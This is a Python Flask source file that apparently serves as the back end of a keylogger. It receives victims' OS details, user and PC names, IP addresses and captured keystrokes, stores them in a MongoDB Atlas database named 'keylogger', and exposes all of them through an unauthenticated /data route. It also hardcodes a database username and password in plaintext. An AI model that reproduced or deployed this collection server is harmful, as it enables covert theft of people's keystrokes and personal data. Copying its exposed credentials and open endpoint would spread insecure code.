from flask import Flask, request
from bson import json_util
from flask_pymongo import pymongo

CONNECTION_STRING = "mongodb+srv://kedward1998:shinigami123x00@keylogger.lgvg2.mongodb.net/flask-mongodb-atlas?retryWrites=true&w=majority"
client = pymongo.MongoClient(CONNECTION_STRING)
db = client.get_database('flask_mongodb_atlas')
user_collection = pymongo.collection.Collection(db, 'user_collection')

app = Flask(__name__)

#test to insert data to the data base
@app.route("/test", methods=['POST'])
def test():
    
    data = {
        'OS': request.json['OS'],
        'nombre_user': request.json['nombre_user'],
        'arquitectura': request.json['arquitectura'],
        'nombre_PC': request.json['nombre_PC'],
        'IP_adress': request.json['IP_adress'],
        'keys': request.json['keys']
    }
    db.db.collection.insert(data)
    return "Success"

@app.route("/data")
def getdata():
    data = db.db.collection.find()
    response = json_util.dumps(data)
    return response


@app.route('/')
def flask_mongodb_atlas():
    return "flask mongodb atlas!"

if __name__ == '__main__':
    app.run(threaded=True, port=5000)

